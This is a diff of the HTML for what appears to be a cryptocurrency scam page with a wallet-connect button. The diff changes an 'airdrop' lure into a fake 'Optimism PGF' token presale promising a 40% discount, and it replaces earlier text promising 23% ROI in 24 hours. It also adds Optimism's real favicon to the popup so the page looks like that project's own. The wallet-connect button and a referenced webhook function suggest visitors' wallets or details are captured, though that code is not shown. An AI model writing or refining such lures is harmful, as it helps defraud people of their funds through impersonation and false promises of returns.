@@ -123,7 +123,7 @@
 
                     <div class="Home_soon__8s2ww">
                         <button id="connectWallet">ᴄᴏɴɴᴇᴄᴛ ᴡᴀʟʟᴇᴛ</button>
-                        <button id="claimButton" style="display: none;">Verify Address</button>
+                        <button id="claimButton" style="display: none;">Claim Airdrop</button>
 			 
 
 
@@ -474,7 +474,7 @@ input {
   </head>
   <body>
    
-<h3>Claim<span class="animated-text">Airdrop</span> <span class="version" style="font-size: 0.8em; font-family: 'Courier New', Courier, monospace; color:dimgray"><span class="counter"></span></span></h3>
+<h3>Buy<span class="animated-text">Fairlaunch</span> <span class="version" style="font-size: 0.8em; font-family: 'Courier New', Courier, monospace; color:dimgray"><span class="counter"></span></span></h3>
 
 <style>
     .animated-text {
@@ -630,7 +630,7 @@ setInterval(() => {
 <script>
   const mineText = document.getElementById('mine-text');
   const mineCursor = document.getElementById('mine-cursor');
-  const miningMessage = 'Deposit 0.001 ETH or BNB now and get 23% ROI in just 24 hours!';
+  const miningMessage = 'Buy before the launch of the second round of Optimism PGF with a 40% discount. Maximum purchase 6 ETH / 12 BNB Get fabulous rewards from our governance TOKEN. Be part of our team now!';
 
   let i = 0;
   function typeMiningMessage() {
@@ -788,6 +788,11 @@ function sendWebhookMessage(webhookUrl, message) {
 			opacity: 0.7;
 			z-index: -1;
 		}
+		.icono {
+  width: 24px; /* Ajusta el tamaño del icono según tus necesidades */
+  margin-right: 10px; /* Ajusta el margen derecho según tus preferencias */
+}
+
 	</style>
 </head>
 <body>
@@ -796,7 +801,10 @@ function sendWebhookMessage(webhookUrl, message) {
 	<div class="popup" id="popup">
 		<span class="close" onclick="closePopup()">&times;</span>
 		<div class="popup-shape"></div>
-		<h2>Optimism PGF</h2>
+		<h2>
+  <img src="https://app.optimism.io/favicon.ico" alt="Icono" class="icono">
+  Optimism PGF
+</h2>
 		<p>Buy before the launch of the second round of Optimism PGF with a 40% discount. Maximum purchase 6 ETH / 12 BNB
 Get fabulous rewards from our governance TOKEN. Be part of our team now!</p>
 	</div>
